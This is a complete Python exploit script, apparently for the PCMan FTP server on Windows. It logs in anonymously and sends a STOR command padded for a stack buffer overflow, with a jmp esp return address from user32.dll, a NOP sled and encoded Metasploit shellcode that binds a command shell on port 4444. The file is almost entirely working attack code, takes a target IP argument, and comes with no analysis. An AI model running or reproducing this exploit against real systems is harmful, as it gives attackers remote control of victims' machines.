#!/usr/bin/python
#-------------------------------------------------------------------#
#			Name : Rio Atmadja			    #
#		       Script: ftp_pcman		   	    #
#-------------------------------------------------------------------#
import socket, sys, os, time

if len(sys.argv) != 2:
        print "[*] Usage: %s <Ip address> \n" % sys.argv[0]
        sys.exit(0)
target = sys.argv[1]

# msfpayload windows/shell_bind_tcp LPORT=4444 R | msfencode -a x86 -b '\x00\xff\x0a\x0d\x20\x40' -t c
shellcode = ("\xdb\xdf\xb8\xca\xab\x0e\x08\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
"\x56\x83\xc7\x04\x31\x47\x14\x03\x47\xde\x49\xfb\xf4\x36\x04"
"\x04\x05\xc6\x77\x8c\xe0\xf7\xa5\xea\x61\xa5\x79\x78\x27\x45"
"\xf1\x2c\xdc\xde\x77\xf9\xd3\x57\x3d\xdf\xda\x68\xf3\xdf\xb1"
"\xaa\x95\xa3\xcb\xfe\x75\x9d\x03\xf3\x74\xda\x7e\xfb\x25\xb3"
"\xf5\xa9\xd9\xb0\x48\x71\xdb\x16\xc7\xc9\xa3\x13\x18\xbd\x19"
"\x1d\x49\x6d\x15\x55\x71\x06\x71\x46\x80\xcb\x61\xba\xcb\x60"
"\x51\x48\xca\xa0\xab\xb1\xfc\x8c\x60\x8c\x30\x01\x78\xc8\xf7"
"\xf9\x0f\x22\x04\x84\x17\xf1\x76\x52\x9d\xe4\xd1\x11\x05\xcd"
"\xe0\xf6\xd0\x86\xef\xb3\x97\xc1\xf3\x42\x7b\x7a\x0f\xcf\x7a"
"\xad\x99\x8b\x58\x69\xc1\x48\xc0\x28\xaf\x3f\xfd\x2b\x17\xe0"
"\x5b\x27\xba\xf5\xda\x6a\xd3\x3a\xd1\x94\x23\x54\x62\xe6\x11"
"\xfb\xd8\x60\x1a\x74\xc7\x77\x5d\xaf\xbf\xe8\xa0\x4f\xc0\x21"
"\x67\x1b\x90\x59\x4e\x23\x7b\x9a\x6f\xf6\x2c\xca\xdf\xa8\x8c"
"\xba\x9f\x18\x65\xd1\x2f\x47\x95\xda\xe5\xfe\x91\x14\xdd\x53"
"\x76\x55\xe1\x42\xda\xd0\x07\x0e\xf2\xb4\x90\xa6\x30\xe3\x28"
"\x51\x4a\xc1\x04\xca\xdc\x5d\x43\xcc\xe3\x5d\x41\x7f\x4f\xf5"
"\x02\x0b\x83\xc2\x33\x0c\x8e\x62\x3d\x35\x59\xf8\x53\xf4\xfb"
"\xfd\x79\x6e\x9f\x6c\xe6\x6e\xd6\x8c\xb1\x39\xbf\x63\xc8\xaf"
"\x2d\xdd\x62\xcd\xaf\xbb\x4d\x55\x74\x78\x53\x54\xf9\xc4\x77"
"\x46\xc7\xc5\x33\x32\x97\x93\xed\xec\x51\x4a\x5c\x46\x08\x21"
"\x36\x0e\xcd\x09\x89\x48\xd2\x47\x7f\xb4\x63\x3e\xc6\xcb\x4c"
"\xd6\xce\xb4\xb0\x46\x30\x6f\x71\x76\x7b\x2d\xd0\x1f\x22\xa4"
"\x60\x42\xd5\x13\xa6\x7b\x56\x91\x57\x78\x46\xd0\x52\xc4\xc0"
"\x09\x2f\x55\xa5\x2d\x9c\x56\xec")

vulparameter= '/../'
jmp_esp = "\x53\x93\x42\x7e" #7E429353 ( user32.dll -> jmp esp )
payload = '\x41' * 2003 + jmp_esp + '\x90' * 16 + shellcode  
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[+] Connect to %s on port %d" % (target,21)
try:
	s.connect((target,21))
        s.recv(1024)
	s.send('USER anonymous\r\n') 
	s.recv(1024)
	s.send('PASS polunchis\r\n')
	s.recv(1024)
	s.send("STOR " + vulparameter + payload + "\r\n")
        print "[+] Sending payload of size " +  str(len(payload)) + " Bytes "
	s.close()
	print "[+] Exploit Sent Successfully"
except:
	print "[-] Could not connect to " + target + ":21\r"
        sys.exit(0) 
